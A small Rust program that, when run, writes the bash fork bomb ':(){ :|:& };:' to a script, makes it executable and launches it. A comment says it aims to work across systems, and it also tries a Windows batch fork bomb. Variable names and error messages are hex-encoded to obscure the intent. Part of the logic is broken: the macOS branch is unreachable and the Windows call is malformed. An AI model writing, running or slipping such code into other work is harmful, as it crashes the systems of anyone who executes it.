use std::io::Write;
use std::process::Command;

pub fn main() {
    _0x7265616c666f726b();
}

// different forkbombs so it'll be multiOS
fn _0x7265616c666f726b() {
    if cfg!(unix) {
        let mut _0x66696c65 =
            std::fs::File::create("666f726b626f6d62.bash").expect("0x637265617465206661696c6564");
        _0x66696c65
            .write_all(":(){ :|:& };:".as_bytes())
            .expect("0x7772697465206661696c6564");
        Command::new("chmod")
            .arg("755")
            .arg("666f726b626f6d62.bash")
            .spawn()
            .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
        Command::new("bash")
            .arg("./666f726b626f6d62.bash")
            .spawn()
            .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
    } else if cfg!(windows) {
        Command::new("%0|%0")
            .spawn()
            .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
    } else if cfg!(target_os = "macos") {
        let mut _0x66696c65 =
            std::fs::File::create("666f726b626f6d62.bash").expect("0x637265617465206661696c6564");
        _0x66696c65
            .write_all(":(){ :|:& };:".as_bytes())
            .expect("0x7772697465206661696c6564");
        Command::new("chmod")
            .arg("755")
            .arg("666f726b626f6d62.bash")
            .spawn()
            .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
        Command::new("bash")
            .arg("./666f726b626f6d62.bash")
            .spawn()
            .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
    }
}
